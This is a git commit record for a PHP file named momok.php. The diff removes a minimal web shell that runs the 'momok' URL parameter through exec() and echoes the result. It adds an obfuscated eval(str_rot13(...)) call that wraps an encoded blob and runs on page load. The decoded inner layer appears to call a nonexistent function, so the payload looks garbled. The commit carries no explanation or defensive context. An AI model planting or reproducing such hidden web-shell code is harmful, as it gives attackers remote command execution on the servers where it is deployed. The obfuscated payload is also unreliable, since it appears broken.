63a1d2fff75611eaaa1099f741bf4124a7480a26
dan1584 <pewedandi32@gmail.com>
2025-01-28 16:41:37 +0700

    Update momok.php

--- momok.php
+++ momok.php
@@ -1,3 +1,3 @@
-<?php if ($_GET['momok']) {
-    echo exec($_GET['momok']);
-};?>
+<?php
+eval(str_rot13("riny(fgq_fgbg13(\"Czo4OlxPH2wzYGYoYmkoIGo4bikmJnpbPHwuZWQ6ajohbG4oYGYmZzsnYCsmJiQxOn5nJnY5OmJiOiFmbGZsYmgnOGggOG49PSZvbDgnbiYmN2o7PSYiPT0qL35zZG16eQowNDBudmFiOGBtNmNzYTIuZng6ay5nbGBjYmhlOmYiKTs=\"));"));
+?>
